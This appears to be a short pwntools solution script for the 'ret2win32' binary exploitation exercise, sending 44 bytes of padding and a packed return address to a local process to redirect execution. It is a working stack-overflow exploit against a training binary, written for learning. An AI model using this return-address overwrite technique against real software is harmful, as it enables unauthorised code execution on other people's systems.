from pwn import *

pr = process("./ret2win32")

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
payload += p32(0x0804862c)
pr.sendline(payload)

print pr.read()
